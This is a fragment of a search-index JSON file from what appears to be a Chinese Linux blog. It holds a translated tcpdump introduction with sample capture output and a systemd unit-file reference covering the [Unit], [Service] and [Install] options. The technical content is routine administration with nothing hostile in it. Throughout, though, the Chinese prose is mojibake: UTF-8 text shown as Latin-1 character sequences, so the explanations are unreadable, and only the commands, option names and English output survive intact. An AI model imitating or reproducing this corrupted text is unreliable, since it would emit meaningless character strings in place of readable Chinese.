äººå€¼å®ˆå®‰è£…","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"ä»‹ç»åœ¨Linuxå‘½ä»¤è¡Œä¸­ä½¿ç”¨tcpdump","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/","tags":["linux","tcpdump"],"title":"ä»‹ç»åœ¨Linuxå‘½ä»¤è¡Œä¸­ä½¿ç”¨tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" å¼•ç”¨ ä»‹ç»åœ¨Linuxå‘½ä»¤è¡Œä¸­ä½¿ç”¨tcpdump æ–‡ç« åŸæ–‡æ¥æº opensource.com, ç”±æœ¬ç«™ç¿»è¯‘å‘å¸ƒç”¨äºä¸ªäººæœé›†ã€‚ https://opensource.com/article/18/10/introduction-tcpdump tcpdumpæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ã€åŠŸèƒ½å¤šæ ·çš„å·¥å…·ï¼ŒåŒ…æ‹¬è®¸å¤šé€‰é¡¹å’Œè¿‡æ»¤å™¨ï¼Œå¯ä»¥åœ¨å„ç§æƒ…å†µä¸‹ä½¿ç”¨ã€‚ç”±äºå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œæ‰€ä»¥æœ€å¥½åœ¨æ²¡æœ‰GUIçš„è¿œç¨‹æœåŠ¡å™¨æˆ–è®¾å¤‡ä¸Šè¿è¡Œï¼Œä»¥ä¾¿æ”¶é›†å¯ä»¥ç¨ååˆ†æçš„æ•°æ®ã€‚å®ƒä¹Ÿå¯ä»¥åœ¨åå°å¯åŠ¨ï¼Œæˆ–è€…ä½¿ç”¨cronä¹‹ç±»çš„å·¥å…·ä½œä¸ºè®¡åˆ’ä½œä¸šå¯åŠ¨ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€äº›tcpdumpæœ€å¸¸è§çš„åŠŸèƒ½ã€‚ 1. åœ¨Linuxä¸Šå®‰è£… TcpdumpåŒ…å«åœ¨å‡ ä¸ªLinuxå‘è¡Œç‰ˆä¸­ï¼Œæ‰€ä»¥æ‚¨å¯èƒ½å·²ç»å®‰è£…äº†å®ƒã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å·²å®‰è£…tcpdump: $\u003e which tcpdump /usr/sbin/tcpdump å¦‚æœæ²¡æœ‰å®‰è£…tcpdumpï¼Œå¯ä»¥ä½¿ç”¨å‘è¡Œç‰ˆçš„åŒ…ç®¡ç†å™¨å®‰è£…å®ƒã€‚ä¾‹å¦‚ï¼Œåœ¨CentOSæˆ–Red Hat Enterprise Linuxä¸Šï¼Œå¦‚ä¸‹æ‰€ç¤º: $\u003e sudo yum install -y tcpdump Tcpdumpéœ€è¦libpcapï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºç½‘ç»œåŒ…æ•è·çš„åº“ã€‚å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œå®ƒå°†è‡ªåŠ¨ä½œä¸ºä¾èµ–é¡¹æ·»åŠ ã€‚ ä½ å·²ç»å‡†å¤‡å¥½å¼€å§‹æ•è·ä¸€äº›åŒ…äº†ä¹ˆã€‚ 2. ä½¿ç”¨tcpdumpæ•è·æ•°æ®åŒ… è¦æ•è·ç”¨äºæ•…éšœæ’é™¤æˆ–åˆ†æçš„åŒ…ï¼Œtcpdumpéœ€è¦æé«˜æƒé™ï¼Œå› æ­¤åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œå¤§å¤šæ•°å‘½ä»¤éƒ½ä»¥sudoä½œä¸ºå‰ç¼€ã€‚ é¦–å…ˆï¼Œä½¿ç”¨å‘½ä»¤tcpdump -DæŸ¥çœ‹å“ªäº›æ¥å£å¯ç”¨æ¥æ•è·: $\u003e sudo tcpdump -D 1.eth0 2.virbr0 3.eth1 4.any (Pseudo-device that captures on all interfaces) 5.lo [Loopback] åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æˆ‘çš„æœºå™¨ä¸­æ‰€æœ‰å¯ç”¨çš„æ¥å£ã€‚ç‰¹æ®Šæ¥å£anyå…è®¸åœ¨ä»»ä½•æ´»åŠ¨æ¥å£ä¸­æ•è·ã€‚ è®©æˆ‘ä»¬ä½¿ç”¨å®ƒå¼€å§‹æ•è·ä¸€äº›åŒ…ã€‚é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ•è·ä»»ä½•æ¥å£ä¸­çš„æ‰€æœ‰æ•°æ®åŒ… : $\u003e sudo tcpdump -i any tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 09:56:18.293641 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3770820720:3770820916, ack 3503648727, win 309, options [nop,nop,TS val 76577898 ecr 510770929], length 196 09:56:18.293794 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 391, options [nop,nop,TS val 510771017 ecr 76577898], length 0 09:56:18.295058 IP rhel75.59883 \u003e gateway.domain: 2486+ PTR? 1.64.168.192.in-addr.arpa. (43) 09:56:18.310225 IP gateway.domain \u003e rhel75.59883: 2486 NXDomain* 0/1/0 (102) 09:56:18.312482 IP rhel75.49685 \u003e gateway.domain: 34242+ PTR? 28.64.168.192.in-addr.arpa. (44) 09:56:18.322425 IP gateway.domain \u003e rhel75.49685: 34242 NXDomain* 0/1/0 (103) 09:56:18.323164 IP rhel75.56631 \u003e gateway.domain: 29904+ PTR? 1.122.168.192.in-addr.arpa. (44) 09:56:18.323342 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 196:584, ack 1, win 309, options [nop,nop,TS val 76577928 ecr 510771017], length 388 09:56:18.323563 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 584, win 411, options [nop,nop,TS val 510771047 ecr 76577928], length 0 09:56:18.335569 IP gateway.domain \u003e rhel75.56631: 29904 NXDomain* 0/1/0 (103) 09:56:18.336429 IP rhel75.44007 \u003e gateway.domain: 61677+ PTR? 98.122.168.192.in-addr.arpa. (45) 09:56:18.336655 IP gateway.domain \u003e rhel75.44007: 61677* 1/0/0 PTR rhel75. (65) 09:56:18.337177 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 584:1644, ack 1, win 309, options [nop,nop,TS val 76577942 ecr 510771047], length 1060 ---- SKIPPING LONG OUTPUT ----- 09:56:19.342939 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 1752016, win 1444, options [nop,nop,TS val 510772067 ecr 76578948], length 0 ^C 9003 packets captured 9010 packets received by filter 7 packets dropped by kernel $\u003e Tcpdumpç»§ç»­æ•è·æ•°æ®åŒ…ï¼Œç›´åˆ°å®ƒæ¥æ”¶åˆ°ä¸­æ–­ä¿¡å·ã€‚æ‚¨å¯ä»¥æŒ‰Ctrl+Cä¸­æ–­æ•è·ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°ï¼Œtcpdumpæ•è·äº†è¶…è¿‡9,000ä¸ªåŒ…ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œç”±äºæˆ‘ä½¿ç”¨sshè¿æ¥åˆ°æ­¤æœåŠ¡å™¨ï¼Œæ‰€ä»¥tcpdumpæ•è·äº†æ‰€æœ‰è¿™äº›åŒ…ã€‚è‹¥è¦é™åˆ¶æ•è·çš„æ•°æ®åŒ…æ•°é‡å¹¶åœæ­¢tcpdumpï¼Œè¯·ä½¿ç”¨-cé€‰é¡¹: $\u003e sudo tcpdump -i any -c 5 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 11:21:30.242740 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3772575680:3772575876, ack 3503651743, win 309, options [nop,nop,TS val 81689848 ecr 515883153], length 196 11:21:30.242906 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 1443, options [nop,nop,TS val 515883235 ecr 81689848], length 0 11:21:30.244442 IP rhel75.43634 \u003e gateway.domain: 57680+ PTR? 1.64.168.192.in-addr.arpa. (43) 11:21:30.244829 IP gateway.domain \u003e rhel75.43634: 57680 NXDomain 0/0/0 (43) 11:21:30.247048 IP rhel75.33696 \u003e gateway.domain: 37429+ PTR? 28.64.168.192.in-addr.arpa. (44) 5 packets captured 12 packets received by filter 0 packets dropped by kernel $\u003e åœ¨æœ¬ä¾‹ä¸­ï¼Œtcpdumpåœ¨æ•è·5ä¸ªåŒ…ä¹‹åè‡ªåŠ¨åœæ­¢æ•è·ã€‚è¿™åœ¨ä¸åŒçš„åœºæ™¯ä¸­éƒ½å¾ˆæœ‰ç”¨â€”â€”ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ­£åœ¨å¯¹è¿æ¥è¿›è¡Œæ•…éšœè¯Šæ–­ï¼Œå¹¶ä¸”æ•è·å‡ ä¸ªåˆå§‹åŒ…å°±è¶³å¤Ÿäº†ã€‚å½“æˆ‘ä»¬åº”ç”¨è¿‡æ»¤å™¨æ¥æ•è·ç‰¹å®šçš„åŒ…æ—¶ï¼Œè¿™ç”šè‡³æ›´æœ‰ç”¨(å¦‚ä¸‹æ‰€ç¤º)ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œtcpdumpå°†IPåœ°å€å’Œç«¯å£è§£æä¸ºåç§°ï¼Œå¦‚å‰é¢çš„ç¤ºä¾‹æ‰€ç¤ºã€‚åœ¨æ’é™¤ç½‘ç»œé—®é¢˜æ—¶ï¼Œé€šå¸¸æ›´å®¹æ˜“ä½¿ç”¨IPåœ°å€å’Œç«¯å£å·; ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:0:0","tags":["linux","tcpdump"],"title":"ä»‹ç»åœ¨Linuxå‘½ä»¤è¡Œä¸­ä½¿ç”¨tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Systemctlä¹‹systemdè‡ªå®šä¹‰ç³»ç»ŸæœåŠ¡","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/","tags":["linux","ä¼˜åŒ–","systemd","è§£å†³æ–¹æ¡ˆ"],"title":"Systemctlä¹‹systemdè‡ªå®šä¹‰ç³»ç»ŸæœåŠ¡","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" ä»¥ä¸‹ä¸ºèµ„æ–™æ¥æº,ç”±æœ¬ç«™æ”¶é›†é‡æ–°æ•´ç†å‘å¸ƒ,ä»…ç”¨äºä¸ªäººæ”¶è—,è½¬è½½è¯·ç›´æ¥æ ‡æ³¨ä»¥ä¸‹æ¥æºè¿æ¥ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html http://www.ruanyifeng.com/blog/2018/03/systemd-timer.html 1. [Unit] Unit å®šä¹‰å¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³» å•å…ƒ(Unit)æ˜¯ Systemd çš„æœ€å°åŠŸèƒ½å•ä½ï¼Œæ˜¯å•ä¸ªè¿›ç¨‹çš„æè¿°ã€‚ä¸€ä¸ªä¸ªå°çš„å•å…ƒäº’ç›¸è°ƒç”¨å’Œä¾èµ–ï¼Œç»„æˆä¸€ä¸ªåºå¤§çš„ä»»åŠ¡ç®¡ç†ç³»ç»Ÿ å…¶ä»–çš„å•å…ƒç±»å‹ https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files Systemd æ ¹æ®ä»–ä»¬æè¿°çš„èµ„æºç±»å‹å¯¹å•ä½è¿›è¡Œåˆ†ç±»ã€‚ç¡®å®šå•å…ƒç±»å‹çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨å…¶ç±»å‹åç¼€ï¼Œè¯¥åç¼€é™„åŠ åˆ°èµ„æºåç§°çš„æœ«å°¾ã€‚ ä»¥ä¸‹åˆ—è¡¨æè¿°äº†å¯ç”¨äºä»¥ä¸‹å„é¡¹çš„å•ä½ç±»å‹systemd: .service: æœåŠ¡å•å…ƒæè¿°å¦‚ä½•ç®¡ç†æœåŠ¡å™¨ä¸Šçš„æœåŠ¡æˆ–åº”ç”¨ç¨‹åºã€‚è¿™å°†åŒ…æ‹¬å¦‚ä½•å¯åŠ¨æˆ–åœæ­¢æœåŠ¡ï¼Œåº”åœ¨ä½•ç§æƒ…å†µä¸‹è‡ªåŠ¨å¯åŠ¨æœåŠ¡ï¼Œä»¥åŠç›¸å…³è½¯ä»¶çš„ä¾èµ–å…³ç³»å’Œè®¢è´­ä¿¡æ¯ã€‚ .socket: å¥—æ¥å­—å•å…ƒæ–‡ä»¶æè¿°ç½‘ç»œæˆ–IPCå¥—æ¥å­—ï¼Œæˆ–systemdç”¨äºåŸºäºå¥—æ¥å­—çš„æ¿€æ´»çš„FIFOç¼“å†²åŒºã€‚è¿™äº›.serviceæ–‡ä»¶å§‹ç»ˆå…·æœ‰ä¸€ä¸ªå…³è”æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†åœ¨æœ¬å•å…ƒå®šä¹‰çš„å¥—æ¥å­—ä¸Šçœ‹åˆ°æ´»åŠ¨æ—¶å¯åŠ¨ã€‚ .device: æè¿°å·²è¢«æŒ‡å®šä¸ºéœ€è¦systemdç®¡ç†çš„è®¾å¤‡udevæˆ–sysfsæ–‡ä»¶ç³»ç»Ÿçš„å•å…ƒã€‚å¹¶éæ‰€æœ‰è®¾å¤‡éƒ½æœ‰.deviceæ–‡ä»¶ã€‚.deviceå¯èƒ½éœ€è¦å•å…ƒçš„ä¸€äº›åœºæ™¯æ˜¯ç”¨äºè®¢è´­ï¼Œå®‰è£…å’Œè®¿é—®è®¾å¤‡ã€‚ .mount: æ­¤å•å…ƒå®šä¹‰è¦ç”±å…¶ç®¡ç†çš„ç³»ç»Ÿä¸Šçš„æŒ‚è½½ç‚¹systemdã€‚è¿™äº›ä»¥å®‰è£…è·¯å¾„å‘½åï¼Œæ–œæ æ›´æ”¹ä¸ºç ´æŠ˜å·ã€‚å…¶ä¸­çš„æ¡ç›®/etc/fstabå¯ä»¥è‡ªåŠ¨åˆ›å»ºå•ä½ã€‚ .automount: ä¸€ä¸ª.automountå•å…ƒé…ç½®å°†è‡ªåŠ¨æŒ‚è½½çš„æŒ‚è½½ç‚¹ã€‚è¿™äº›å¿…é¡»ä»¥å®ƒä»¬å¼•ç”¨çš„æŒ‚è½½ç‚¹å‘½åï¼Œå¹¶ä¸”å¿…é¡»å…·æœ‰åŒ¹é….mountå•å…ƒä»¥å®šä¹‰æŒ‚è½½çš„ç»†èŠ‚ã€‚ .swap: æ­¤å•å…ƒæè¿°ç³»ç»Ÿä¸Šçš„äº¤æ¢ç©ºé—´ã€‚è¿™äº›å•å…ƒçš„åç§°å¿…é¡»åæ˜ ç©ºé—´çš„è®¾å¤‡æˆ–æ–‡ä»¶è·¯å¾„ã€‚ .target: ç›®æ ‡å•å…ƒç”¨äºåœ¨å¯åŠ¨æˆ–æ›´æ”¹çŠ¶æ€æ—¶ä¸ºå…¶ä»–å•å…ƒæä¾›åŒæ­¥ç‚¹ã€‚å®ƒä»¬è¿˜å¯ç”¨äºä½¿ç³»ç»Ÿè¿›å…¥æ–°çŠ¶æ€ã€‚å…¶ä»–å•ä½æŒ‡å®šå®ƒä»¬ä¸ç›®æ ‡çš„å…³ç³»ä»¥ä¸ç›®æ ‡çš„æ“ä½œè”ç³»èµ·æ¥ã€‚ .path: æ­¤å•å…ƒå®šä¹‰å¯ç”¨äºåŸºäºè·¯å¾„çš„æ¿€æ´»çš„è·¯å¾„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ.serviceå½“è·¯å¾„è¾¾åˆ°æŒ‡å®šçŠ¶æ€æ—¶ï¼Œå°†å¯åŠ¨ç›¸åŒåŸºæœ¬åç§°çš„å•å…ƒã€‚è¿™ç”¨äºinotifyç›‘è§†æ›´æ”¹çš„è·¯å¾„ã€‚ .timer: .timerå•å…ƒå®šä¹‰å°†ç”±å…¶ç®¡ç†çš„è®¡æ—¶å™¨systemdï¼Œç±»ä¼¼äºcronå»¶è¿Ÿæˆ–è®¡åˆ’æ¿€æ´»çš„ä½œä¸šã€‚è¾¾åˆ°è®¡æ—¶å™¨æ—¶å°†å¯åŠ¨åŒ¹é…å•å…ƒã€‚ .snapshot: å‘½ä»¤.snapshotè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå•å…ƒsystemctl snapshotã€‚å®ƒå…è®¸æ‚¨åœ¨è¿›è¡Œæ›´æ”¹åé‡å»ºç³»ç»Ÿçš„å½“å‰çŠ¶æ€ã€‚å¿«ç…§ä¸ä¼šè·¨ä¼šè¯ç”Ÿå­˜ï¼Œå¹¶ç”¨äºå›æ»šä¸´æ—¶çŠ¶æ€ã€‚ .slice: .sliceå•å…ƒä¸Linuxæ§åˆ¶ç»„èŠ‚ç‚¹å…³è”ï¼Œå…è®¸é™åˆ¶èµ„æºæˆ–å°†èµ„æºåˆ†é…ç»™ä¸è¯¥ç‰‡å…³è”çš„ä»»ä½•è¿›ç¨‹ã€‚è¯¥åç§°åæ˜ äº†å®ƒåœ¨cgroupæ ‘ä¸­çš„å±‚æ¬¡ç»“æ„ä½ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå•ä½ä¼šæ ¹æ®å…¶ç±»å‹æ”¾ç½®åœ¨æŸäº›åˆ‡ç‰‡ä¸­ã€‚ .scope: èŒƒå›´å•å…ƒsystemdç”±ä»å…¶æ€»çº¿æ¥å£æ¥æ”¶çš„ä¿¡æ¯è‡ªåŠ¨åˆ›å»ºã€‚è¿™äº›ç”¨äºç®¡ç†å¤–éƒ¨åˆ›å»ºçš„ç³»ç»Ÿè¿›ç¨‹é›†ã€‚ Description=å½“å‰æœåŠ¡çš„æè¿° Documentation=ç»™å‡ºæ–‡æ¡£çš„ä½ç½®,ä¸€èˆ¬å°±æ˜¯æœåŠ¡å¯åŠ¨å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£ After=è¡¨ç¤ºå¦‚æœæ­¤å­—æ®µæ ‡è®°çš„æœåŠ¡è‹¥éœ€è¦å¯åŠ¨,é‚£ä¹ˆå½“å‰å®šä¹‰çš„æœåŠ¡éœ€è¦åœ¨æ­¤æ ‡è®°æœåŠ¡å™¨å¯åŠ¨ä¹‹å. Before=è¡¨ç¤ºå¦‚æœæ­¤å­—æ®µæ ‡è®°çš„æœåŠ¡è‹¥éœ€è¦å¯åŠ¨,é‚£ä¹ˆå½“å‰å®šä¹‰çš„æœåŠ¡éœ€è¦åœ¨æ­¤æ ‡è®°æœåŠ¡å™¨å¯åŠ¨ä¹‹å‰. Wants=è¡¨ç¤ºæ­¤å­—æ®µæ ‡è®°çš„æœåŠ¡ä¸å½“å‰å®šä¹‰æœåŠ¡å­˜åœ¨\"å¼±ä¾èµ–\"å…³ç³»,å³è¡¨ç¤ºå½“å‰å®šä¹‰çš„èŠ‚ç‚¹æœåŠ¡å¯åŠ¨å¤±è´¥æˆ–è€…åœæ­¢è¿è¡Œ,ä¸å½±å“å½“å‰å®šä¹‰çš„æœåŠ¡ç»§ç»­æ‰§è¡Œ. Requires=è¡¨ç¤ºæ­¤å­—æ®µæ ‡è®°çš„æœåŠ¡ä¸å½“å‰å®šä¹‰æœåŠ¡å­˜åœ¨\"å¼ºä¾èµ–\"å…³ç³»,å³è¡¨ç¤ºå½“å‰å®šä¹‰çš„èŠ‚ç‚¹æœåŠ¡å¯åŠ¨å¤±è´¥æˆ–è€…åœæ­¢è¿è¡Œ,é‚£ä¹ˆå½“å‰å®šä¹‰çš„æœåŠ¡ä¹Ÿå¿…é¡»åœæ­¢. 2. [Service] ServiceåŒºå—å®šä¹‰å¦‚ä½•å¯åŠ¨å½“å‰æœåŠ¡ã€‚ æ³¨æ„ï¼š[Service]éƒ¨åˆ†çš„å¯åŠ¨ã€é‡å¯ã€åœæ­¢å‘½ä»¤å…¨éƒ¨è¦æ±‚ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„åˆ™ä¼šæŠ¥é”™ï¼ Environment=æŒ‡å®šå½“å‰æœåŠ¡è¿è¡Œçš„ç¯å¢ƒå‚æ•°,è¯¥å€¼ä½¿ç”¨key=valueå¥å€¼å¯¹ ;Environment=LANG=C EnvironmentFile=æŒ‡å®šå½“å‰æœåŠ¡çš„ç¯å¢ƒå‚æ•°æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å†…éƒ¨çš„key=valueé”®å€¼å¯¹ï¼Œå¯ä»¥ç”¨$keyçš„å½¢å¼ï¼Œåœ¨å½“å‰é…ç½®æ–‡ä»¶ä¸­è·å–ã€‚ Type=å­—æ®µå®šä¹‰æœåŠ¡å¯åŠ¨ç±»å‹ ;Type=simple(é»˜è®¤å€¼): ExecStartå­—æ®µå¯åŠ¨çš„è¿›ç¨‹ä¸ºä¸»è¿›ç¨‹ ;Type=exec: ç±»ä¼¼äºsimpleï¼Œsimpleè¡¨ç¤ºå½“fork()å‡½æ•°è¿”å›æ—¶ï¼Œå³è¡¨ç¤ºå¯åŠ¨å®Œæˆï¼Œè€Œexecåˆ™è¡¨ç¤ºä»…åœ¨fork()å’Œexecve()å‡½æ•°éƒ½æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰ç®—å¯åŠ¨å®Œæˆ. ;Type=forkingï¼šExecStartå­—æ®µå°†ä»¥fork()æ–¹å¼å¯åŠ¨ï¼Œæ­¤æ—¶çˆ¶è¿›ç¨‹å°†ä¼šé€€å‡ºï¼Œå­è¿›ç¨‹å°†æˆä¸ºä¸»è¿›ç¨‹ ;Type=oneshotï¼šç±»ä¼¼äºsimpleï¼Œä½†åªæ‰§è¡Œä¸€æ¬¡ï¼ŒSystemd ä¼šç­‰å®ƒæ‰§è¡Œå®Œï¼Œæ‰å¯åŠ¨å…¶ä»–æœåŠ¡ ;Type=dbusï¼šç±»ä¼¼äºsimpleï¼Œä½†ä¼šç­‰å¾… D-Bus ä¿¡å·åå¯åŠ¨ ;Type=notifyï¼šç±»ä¼¼äºsimpleï¼Œå¯åŠ¨ç»“æŸåä¼šå‘å‡ºé€šçŸ¥ä¿¡å·ï¼Œç„¶å Systemd å†å¯åŠ¨å…¶ä»–æœåŠ¡ ;Type=idleï¼šç±»ä¼¼äºsimpleï¼Œä½†æ˜¯è¦ç­‰åˆ°å…¶ä»–ä»»åŠ¡éƒ½æ‰§è¡Œå®Œï¼Œæ‰ä¼šå¯åŠ¨è¯¥æœåŠ¡ã€‚ä¸€ç§ä½¿ç”¨åœºåˆæ˜¯ä¸ºè®©è¯¥æœåŠ¡çš„è¾“å‡ºï¼Œä¸ä¸å…¶ä»–æœåŠ¡çš„è¾“å‡ºç›¸æ··åˆ TimeoutStopSec=åœæ­¢æœåŠ¡æ—¶çš„ç­‰å¾…çš„ç§’æ•°ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´æœåŠ¡ä»ç„¶æ²¡æœ‰åœæ­¢ï¼Œsystemd ä¼šä½¿ç”¨ SIGKILL ä¿¡å·å¼ºè¡Œæ€æ­»æœåŠ¡çš„è¿›ç¨‹ã€‚ TimeoutStartSec=å¯åŠ¨æœåŠ¡æ—¶çš„ç­‰å¾…çš„ç§’æ•°ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´æœåŠ¡ä»»ç„¶æ²¡æœ‰æ‰§è¡Œå®Œæ‰€æœ‰çš„å¯åŠ¨å‘½ä»¤ï¼Œåˆ™ systemd ä¼šè®¤ä¸ºæœåŠ¡è‡ªåŠ¨å¤±è´¥ã€‚ ExecStart=å¯åŠ¨æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ ExecReload=é‡å¯æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ ExecStop=åœæ­¢æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ ExecStartPre=å¯åŠ¨æœåŠ¡ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤ ExecStartPost=å¯åŠ¨æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤ ExecStopPost=åœæ­¢æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤ User=æŒ‡å®šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·ï¼Œä¼šå½±å“æœåŠ¡å¯¹æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚ Group=æŒ‡å®šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·ç»„ï¼Œä¼šå½±å“æœåŠ¡å¯¹æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚ RootDirectory=æŒ‡å®šæœåŠ¡è¿›ç¨‹çš„æ ¹ç›®å½•ï¼ˆé»˜è®¤: / ï¼‰ï¼Œå¦‚æœé…ç½®äº†è¿™ä¸ªå‚æ•°åï¼ŒæœåŠ¡å°†æ— æ³•è®¿é—®æŒ‡å®šç›®å½•ä»¥å¤–çš„ä»»ä½•æ–‡ä»¶ã€‚ Nice=æœåŠ¡çš„è¿›ç¨‹ä¼˜å…ˆçº§ï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼Œé»˜è®¤ä¸º0ã€‚-20ä¸ºæœ€é«˜ä¼˜å…ˆçº§ï¼Œ19ä¸ºæœ€ä½ä¼˜å…ˆçº§ KillMode=è¡¨ç¤ºsystemdå¦‚ä½•åœæ­¢å½“å‰å®šä¹‰æœåŠ¡ ;KillMode=control-groupï¼ˆé»˜è®¤å€¼ï¼‰ï¼šå½“å‰æ§åˆ¶ç»„é‡Œé¢çš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œéƒ½ä¼šè¢«æ€æ‰ ;KillMode=processï¼šåªæ€ä¸»è¿›ç¨‹ ;KillMode=mixedï¼šä¸»è¿›ç¨‹å°†æ”¶åˆ° SIGTERM ä¿¡å·ï¼Œå­è¿›ç¨‹æ”¶åˆ° SIGKILL ä¿¡å· ;KillMode=noneï¼šæ²¡æœ‰è¿›ç¨‹ä¼šè¢«æ€æ‰ï¼Œåªæ˜¯æ‰§è¡ŒæœåŠ¡çš„ stop å‘½ä»¤ã€‚ Restart=å®šä¹‰äº†å½“å‰å®šä¹‰æœåŠ¡é€€å‡ºåï¼ŒSystemdçš„é‡å¯æ–¹å¼ã€‚ ;Restart=noï¼ˆé»˜è®¤å€¼ï¼‰ï¼šé€€å‡ºåä¸ä¼šé‡å¯ ;Restart=on-successï¼šåªæœ‰æ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç ä¸º0ï¼‰ï¼Œæ‰ä¼šé‡å¯ ;Restart=on-failureï¼šéæ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç é0ï¼‰ï¼ŒåŒ…æ‹¬è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯ ;Restart=on-abnormalï¼šåªæœ‰è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯ ;Restart=on-abortï¼šåªæœ‰åœ¨æ”¶åˆ°æ²¡æœ‰æ•æ‰åˆ°çš„ä¿¡å·ç»ˆæ­¢æ—¶ï¼Œæ‰ä¼šé‡å¯ ;Restart=on-watchdogï¼šè¶…æ—¶é€€å‡ºï¼Œæ‰ä¼šé‡å¯ ;Restart=alwaysï¼šä¸ç®¡æ˜¯ä»€ä¹ˆé€€å‡ºåŸå› ï¼Œæ€»æ˜¯é‡å¯ RestartSec=12s è¡¨ç¤º Systemd é‡å¯æœåŠ¡ä¹‹å‰ï¼Œéœ€è¦ç­‰å¾…çš„ç§’æ•°ã€‚ 3. [Install] InstallåŒºå—ï¼Œå®šä¹‰å¦‚ä½•å®‰è£…è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œå³æ€æ ·åšåˆ°å¼€æœºå¯åŠ¨ã€‚ WantedBy=è¡¨ç¤ºè¯¥æœåŠ¡æ‰€åœ¨çš„Target 